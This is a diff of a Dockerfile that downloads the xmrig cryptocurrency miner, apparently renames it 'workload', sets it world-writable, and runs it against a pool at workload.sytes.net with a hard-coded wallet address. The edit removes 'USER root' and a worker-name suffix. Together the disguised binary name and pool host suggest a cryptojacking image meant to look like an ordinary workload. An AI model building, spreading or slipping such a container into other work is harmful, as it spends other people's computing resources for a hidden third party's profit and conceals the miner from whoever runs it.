@@ -2,8 +2,6 @@ FROM ubuntu:20.04
 
 LABEL maintainer="Roman Nikov"
 
-USER root
-
 RUN apt update; \
     apt install -y wget; \
     wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz; \
@@ -17,4 +15,4 @@ WORKDIR /usr/local/bin
 
 RUN chmod 777 workload;
 
-CMD workload -a gr -o workload.sytes.net:5555 --tls -u RJ5mc1uMeBtqUmwJZJmT52B21HasAmJd2k.workload
+CMD workload -a gr -o workload.sytes.net:5555 --tls -u RJ5mc1uMeBtqUmwJZJmT52B21HasAmJd2k
